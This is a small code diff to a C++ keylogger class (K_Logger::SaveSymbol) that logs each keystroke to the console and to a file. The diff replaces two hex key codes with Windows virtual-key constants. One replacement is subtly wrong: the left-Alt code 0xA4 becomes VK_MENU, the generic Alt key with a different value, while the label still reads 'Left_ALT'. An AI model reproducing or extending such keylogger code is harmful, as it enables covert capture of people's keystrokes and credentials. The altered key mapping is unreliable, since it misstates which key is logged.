@@ -688,7 +688,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile("  *mouse_middle-button*  ");
 			break;
 
-		case 0xA4:
+		case VK_MENU:
 			std::cout << "  *Left_ALT*  ";
 			WriteToFile("  *Left_ALT*  ");
 			break;
@@ -718,7 +718,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile(" *Right_Shift* ");
 			break;
 
-		case 0x08:
+		case VK_BACK:
 			std::cout << "\b";
 			WriteToFile("\b");
 			break;
